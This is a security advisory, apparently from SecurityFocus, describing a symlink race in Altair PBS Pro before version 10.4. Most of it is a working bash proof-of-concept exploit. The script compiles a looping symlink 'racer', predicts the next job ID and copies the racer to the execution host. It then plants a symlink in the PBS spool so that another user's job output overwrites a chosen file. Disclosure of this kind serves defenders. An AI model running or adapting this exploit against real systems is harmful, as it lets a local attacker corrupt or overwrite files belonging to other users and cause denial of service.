source: http://www.securityfocus.com/bid/41449/info

Altair Engineering PBS Pro creates temporary files in an insecure manner.

An attacker with local access could potentially exploit this issue to perform symbolic-link attacks, overwriting arbitrary files in the context of the affected application.

Successfully mounting a symlink attack may allow the attacker to delete or corrupt sensitive files, which may result in a denial of service. Other attacks may also be possible.

Versions prior to PBS Pro 10.4 are vulnerable. 

#!/bin/bash
#set -x
# PBS Pro < 10.4 o+w race condition vulnerability Proof Of Concept by Bartlomiej Balcerek - bartol@pwr.wroc.pl 
# Must be run on submitting host and will create /tmp/pbs_test_by_bartol file on exec host as a next job owner UID
echo Compiling racer...
cat << EOF  | gcc -x c -o racer.x -
//repeatedly tries to create arbitrary choosen link
#include <unistd.h>

int main(int argc, char* argv[])
{
 if (argc < 3)  {printf("%s","Need 2 arguments!");exit(1);}
 while (1) symlink(argv[1],argv[2]); 
}; 
EOF
if [ ! -x racer.x ]; then echo "Cannot compile C code, do you have gcc installed ?" ;exit 1; fi 
echo Submitting job...
jobname=`echo hostname | qsub -j oe -o out.txt` 
sleep 2
host=`cat out.txt`
if [ -z $host ]; then echo "Cannot determine next execution host, is quere working ?"; exit 1;fi
rm out.txt
echo Next job will be run on $host
echo Copying racer to $host...
scp ./racer.x $host:/tmp
echo Calculating job id...
jobid=`echo $jobname | cut -d . -f 1`
jobid=$(($jobid+1))
if [ ! $jobid -ge 0 ]; then echo "Cannot determine next job ID!";exit 1;fi
echo Next job ID will be $jobid
hostname=`echo $jobname | cut -d . -f 2`
echo Running racer...submit job as different user, than push Ctrl+C after while.
ssh $host -- \(/tmp/racer.x /tmp/pbs_test_by_bartol /var/spool/pbs/spool/${jobid}.${hostname}.OU \)
ssh $host -- killall racer.x
echo /var/spool/pbs/spool on $host content:
ssh $host -- ls -latr /var/spool/pbs/spool
echo Cleaning up...
ssh $host -- unlink /var/spool/pbs/spool/${jobid}.${hostname}.OU
ssh $host -- ls -latr /var/spool/pbs/spool
ssh $host --  rm -v /tmp/racer.x
rm -v racer.x




